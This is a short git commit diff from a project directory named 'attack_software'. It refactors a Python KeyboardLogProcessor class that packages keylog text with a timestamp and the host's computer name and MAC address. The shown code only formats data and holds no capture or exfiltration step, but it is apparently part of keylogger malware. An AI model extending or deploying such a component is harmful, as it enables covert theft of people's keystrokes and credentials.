167ac20ba56313fbc21eb94abdda169d2d69f444
Eclipse <Eclips77@users.noreply.github.com>
2025-02-26 14:54:30 +0200

    fix dictionary order

--- attack_software/src/keyboard_log_processor.py
+++ attack_software/src/keyboard_log_processor.py
@@ -3,8 +3,6 @@ import socket
 from uuid import getnode as get_mac
 
 class KeyboardLogProcessor:
-    def __init__(self):
-        self.logs = {}
 
     def get_computer_info(self):
         mac = get_mac()
@@ -18,16 +16,13 @@ class KeyboardLogProcessor:
         time_stamp = time.strftime("%H:%M:%S")
         computer_info = self.get_computer_info()
 
-        self.logs = {
+        return ({
             "timestamp": time_stamp,
             "computer_name": computer_info["computer_name"],
             "data": keylog_str
-        }
+        })
 
-    def get_log(self):
-        return self.logs
 
 if __name__ == "__main__":
     processor = KeyboardLogProcessor()
-    processor.process_keylog("hello world")
-    print(processor.get_log())
+    print(processor.process_keylog("hello world"))
